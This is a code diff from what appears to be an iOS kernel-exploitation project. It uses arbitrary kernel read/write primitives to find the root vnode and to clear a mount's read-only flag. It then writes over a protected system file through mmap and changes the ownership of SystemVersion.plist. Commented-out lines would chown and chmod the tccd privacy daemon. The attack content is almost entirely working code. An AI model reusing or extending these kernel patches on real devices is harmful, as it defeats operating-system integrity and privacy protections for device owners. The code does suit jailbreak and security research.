@@ -424,6 +424,49 @@ int funTask(u64 kfd, char* process) {
     return 0;
 }
 
+uint64_t findRootVnode(u64 kfd) {
+    uint32_t off_p_textvp = 0x350;
+    uint32_t off_vnode_v_name = 0xb8;
+    uint32_t off_vnode_v_parent = 0xc0;
+    uint32_t off_vnode_v_mount = 0xd8;
+    uint32_t off_mount_mnt_devvp = 0x980;
+    
+    uint64_t launchd_proc = getProc(kfd, 1);
+    
+    uint64_t textvp_pac = kread64(kfd, launchd_proc + off_p_textvp);
+    uint64_t textvp = textvp_pac | 0xffffff8000000000;
+    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);
+
+    uint64_t textvp_nameptr = kread64(kfd, textvp + off_vnode_v_name);
+    uint64_t textvp_name = kread64(kfd, textvp_nameptr);
+    uint64_t devvp = kread64(kfd, (kread64(kfd, textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
+    uint64_t nameptr = kread64(kfd, devvp + off_vnode_v_name);
+    uint64_t name = kread64(kfd, nameptr);
+    char* devName = &name;
+    printf("[i] launchd proc->textvp->v_name: %s, v_mount->mnt_devvp->v_name: %s\n", &textvp_name, devName);
+    
+    uint64_t sbin_vnode = kread64(kfd, textvp + off_vnode_v_parent) | 0xffffff8000000000;
+    textvp_nameptr = kread64(kfd, sbin_vnode + off_vnode_v_name);
+    textvp_name = kread64(kfd, textvp_nameptr);
+    devvp = kread64(kfd, (kread64(kfd, textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
+    nameptr = kread64(kfd, devvp + off_vnode_v_name);
+    name = kread64(kfd, nameptr);
+    devName = &name;
+    printf("[i] launchd proc->textvp->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
+    
+    uint64_t root_vnode = kread64(kfd, sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
+    textvp_nameptr = kread64(kfd, root_vnode + off_vnode_v_name);
+    textvp_name = kread64(kfd, textvp_nameptr);
+    devvp = kread64(kfd, (kread64(kfd, root_vnode + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
+    nameptr = kread64(kfd, devvp + off_vnode_v_name);
+    name = kread64(kfd, nameptr);
+    devName = &name;
+    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
+    printf("[+] rootvnode: 0x%llx\n", root_vnode);
+    
+    return root_vnode;
+}
+
 uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
     //16.1.2 offsets
     uint32_t off_p_pfd = 0xf8;
@@ -433,6 +476,7 @@ uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
     uint32_t off_vnode_v_data = 0xe0;
     uint32_t off_vnode_v_kusecount = 0x5c;
     uint32_t off_vnode_v_references = 0x5b;
+    uint32_t off_vnode_v_name = 0xb8;
     
     int file_index = open(to, O_RDONLY);
     if (file_index == -1) return -1;
@@ -464,7 +508,8 @@ uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
     fileglob = fileglob_pac | 0xffffff8000000000;
     vnode_pac = kread64(kfd, fileglob + off_fg_data);
     uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
-    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
+    
+    uint64_t from_v_data = kread64(kfd, from_vnode+ off_vnode_v_data);
     
     close(file_index);
     
@@ -698,34 +743,6 @@ uint64_t funVnodeResearch(u64 kfd, char* to, char* from) {
     return 0;
 }
 
-uint64_t findRootVnode(u64 kfd) {
-    uint32_t off_p_textvp = 0x350;
-    uint32_t off_vnode_v_name = 0xb8;
-    uint32_t off_vnode_v_parent = 0xc0;
-    
-    uint64_t launchd_proc = getProc(kfd, 1);
-    
-    uint64_t textvp_pac = kread64(kfd, launchd_proc + off_p_textvp);
-    uint64_t textvp = textvp_pac | 0xffffff8000000000;
-    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);
-    
-    uint64_t textvp_nameptr = kread64(kfd, textvp + off_vnode_v_name);
-    uint64_t textvp_name = kread64(kfd, textvp_nameptr);
-    printf("[i] launchd proc->textvp->v_name: %s\n", &textvp_name);
-
-    uint64_t sbin_vnode = kread64(kfd, textvp + off_vnode_v_parent) | 0xffffff8000000000;
-    textvp_nameptr = kread64(kfd, sbin_vnode + off_vnode_v_name);
-    textvp_name = kread64(kfd, textvp_nameptr);
-    printf("[i] launchd proc->textvp->v_parent->v_name: %s\n", &textvp_name);
-    
-    uint64_t root_vnode = kread64(kfd, sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
-    textvp_nameptr = kread64(kfd, root_vnode + off_vnode_v_name);
-    textvp_name = kread64(kfd, textvp_nameptr);
-    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s\n", &textvp_name);
-    
-    return root_vnode;
-}
-
 enum vtype    { VNON, VREG, VDIR, VBLK, VCHR, VLNK, VSOCK, VFIFO, VBAD, VSTR,
               VCPLX };
 
@@ -786,7 +803,7 @@ uint64_t funVnodeResearch2(u64 kfd, char* file) {
     
 #define MNT_RDONLY      0x00000001      /* read only filesystem */
     kwrite32(kfd, to_v_mount + 0x70, to_m_flag & ~MNT_RDONLY);
-    kwrite16(kfd, to_v_mount + off_vnode_v_type, VNON);
+//    kwrite16(kfd, to_v_mount + off_vnode_v_type, VNON);
     
     
     kwrite32(kfd, fileglob + off_fg_flag, O_ACCMODE);
@@ -804,14 +821,35 @@ uint64_t funVnodeResearch2(u64 kfd, char* file) {
     
     
     sleep(1);
-    const char* content = "AAAAAAAAAAAAAAAAAAAAAAA";
-    if(write(file_index, content, strlen(content)) == -1) {
-        perror("file write error");
+    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
+    
+    size_t data_len = strlen(data);
+
+    // 파일의 크기를 가져옵니다.
+    off_t file_size = lseek(file_index, 0, SEEK_END);
+    if (file_size == -1) {
+        perror("Failed lseek.");
+//        close(file);
+//        return;
     }
+    
+    char* mapped = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, file_index, 0);
+    if (mapped == MAP_FAILED) {
+        perror("Failed mmap.");
+//        close(file);
+//        return;
+    }
+    
+    memcpy(mapped, data, data_len);
+//    if(write(file_index, content, strlen(content)) == -1) {
+//        perror("file write error");
+//    }
+    
+    munmap(mapped, file_size);
     
     
 //    kwrite32(kfd, to_v_mount + 0x70, to_m_flag);
-    kwrite16(kfd, to_v_mount + off_vnode_v_type, to_vnode_vtype);
+//    kwrite16(kfd, to_v_mount + off_vnode_v_type, to_vnode_vtype);
     
     close(file_index);
 
@@ -880,23 +918,23 @@ int do_fun(u64 kfd) {
     funTask(kfd, "kfd");
     
     //Patch
-    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
+//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
     //Restore
-    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
+//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
     
     
     //Patch
-    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
+//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
     //Restore
-    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
     
     mach_port_t host_self = mach_host_self();
     printf("[i] mach_host_self: 0x%x\n", host_self);
     fun_ipc_entry_lookup(kfd, host_self);
     
-    NSString *path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/abcd.txt"];
-    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
-    [@"Hello, this is an example file!" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
+//    NSString *path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/abcd.txt"];
+//    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
+//    [@"Hello, this is an example file!" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
     
     //NEW WAY, open with O_RDONLY AND PATCH TO O_RDWR
     funVnodeChown(kfd, "/System/Library/CoreServices/SystemVersion.plist", 501, 501);
@@ -908,11 +946,11 @@ int do_fun(u64 kfd) {
     
 
     
-    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
+//    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
 //    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
 //    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
 //    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
-//    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/");
+//    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/private");
 //    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
 //    NSLog(@"/var directory: %@", dirs);
     
